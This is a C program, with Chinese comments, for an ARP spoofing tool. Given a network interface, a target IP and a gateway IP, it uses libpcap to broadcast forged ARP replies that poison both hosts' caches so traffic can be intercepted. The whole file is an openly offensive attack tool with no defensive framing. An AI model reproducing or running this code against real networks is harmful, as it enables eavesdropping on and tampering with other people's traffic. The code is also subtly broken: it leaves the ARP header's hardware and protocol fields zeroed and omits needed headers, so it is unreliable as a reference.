#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>

#define IP_ADDR_LEN 4
#define ETH_ALEN 6

void usage() {
    printf("Usage: ./arp_spoof <interface> <target_ip> <gateway_ip>\n");
    exit(1);
}

// 打包並發送 ARP 請求
void send_arp(pcap_t *handle, u_char *src_mac, u_char *dst_mac, 
              u_char *src_ip, u_char *dst_ip, u_short op_code) {
    struct ether_header eth_hdr;
    struct ether_arp arp_hdr;

    memset(&eth_hdr, 0, sizeof(struct ether_header));
    memcpy(eth_hdr.ether_shost, src_mac, ETH_ALEN);
    memcpy(eth_hdr.ether_dhost, dst_mac, ETH_ALEN);
    eth_hdr.ether_type = htons(ETHERTYPE_ARP);

    memset(&arp_hdr, 0, sizeof(struct ether_arp));
    arp_hdr.arp_op = htons(op_code);  // ARP request or reply
    memcpy(arp_hdr.arp_sha, src_mac, ETH_ALEN);
    memcpy(arp_hdr.arp_spa, src_ip, IP_ADDR_LEN);
    memcpy(arp_hdr.arp_tha, dst_mac, ETH_ALEN);
    memcpy(arp_hdr.arp_tpa, dst_ip, IP_ADDR_LEN);

    u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
    memcpy(packet, &eth_hdr, sizeof(struct ether_header));
    memcpy(packet + sizeof(struct ether_header), &arp_hdr, sizeof(struct ether_arp));

    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
        printf("Error sending ARP packet\n");
        exit(1);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    char *dev = argv[1];
    char *target_ip_str = argv[2];
    char *gateway_ip_str = argv[3];

    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct in_addr target_ip, gateway_ip;

    // 轉換 IP 地址
    if (inet_pton(AF_INET, target_ip_str, &target_ip) != 1 || 
        inet_pton(AF_INET, gateway_ip_str, &gateway_ip) != 1) {
        printf("Invalid IP address\n");
        exit(1);
    }

    // 開始捕獲網卡
    handle = pcap_open_live(dev, 65536, 1, 0, errbuf);
    if (handle == NULL) {
        printf("Error opening device %s: %s\n", dev, errbuf);
        exit(1);
    }

    // 獲取本機 MAC 地址
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, dev);
    ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    close(sockfd);

    u_char *src_mac = (u_char *)ifr.ifr_hwaddr.sa_data;

    // 發送 ARP 伪造包
    send_arp(handle, src_mac, (u_char *)"\xFF\xFF\xFF\xFF\xFF\xFF", 
             (u_char *)&target_ip, (u_char *)&gateway_ip, ARPOP_REPLY);
    send_arp(handle, src_mac, (u_char *)"\xFF\xFF\xFF\xFF\xFF\xFF", 
             (u_char *)&gateway_ip, (u_char *)&target_ip, ARPOP_REPLY);

    pcap_close(handle);

    return 0;
}
